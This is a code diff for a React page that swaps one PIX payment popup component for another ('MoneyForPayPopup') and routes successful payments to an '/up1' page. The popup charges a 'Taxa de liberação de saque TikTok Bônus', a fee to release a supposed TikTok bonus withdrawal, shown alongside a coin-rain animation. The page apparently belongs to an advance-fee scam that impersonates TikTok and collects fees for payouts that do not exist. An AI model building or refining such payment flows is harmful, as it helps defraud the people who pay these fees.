@@ -1,7 +1,7 @@
 import { useState, useEffect, useCallback, useRef } from 'react';
 import { useNavigate } from 'react-router-dom';
 import '../styles/app.css';
-import PixPaymentPopup from '@/components/PixPaymentPopup';
+import MoneyForPayPopup from '@/components/MoneyForPayPopup';
 import CoinRainEffect from '@/components/CoinRainEffect';
 
 // Currency animation helper
@@ -209,6 +209,11 @@ const Index = () => {
   const getCurrentDate = () => {
     const now = new Date();
     return `${String(now.getDate()).padStart(2, '0')}/${String(now.getMonth() + 1).padStart(2, '0')}/${now.getFullYear()}`;
+  };
+
+  const handlePaymentSuccess = () => {
+    setShowPixPopup(false);
+    navigate('/up1');
   };
 
   return (
@@ -751,15 +756,13 @@ const Index = () => {
         </div>
       </section>
 
-      {/* PIX Payment Popup */}
+      {/* MoneyForPay PIX Payment Popup */}
       {showPixPopup && (
-        <PixPaymentPopup
+        <MoneyForPayPopup
           amount={TAXA_SAQUE_CENTAVOS}
-          description="Taxa de liberação de saque TikTok Bônus"
-          onSuccess={() => {
-            setShowPixPopup(false);
-            navigate('/up1');
-          }}
+          productName="Taxa de liberação de saque TikTok Bônus"
+          pageOrigin="Index"
+          onSuccess={handlePaymentSuccess}
           onClose={() => setShowPixPopup(false)}
         />
       )}
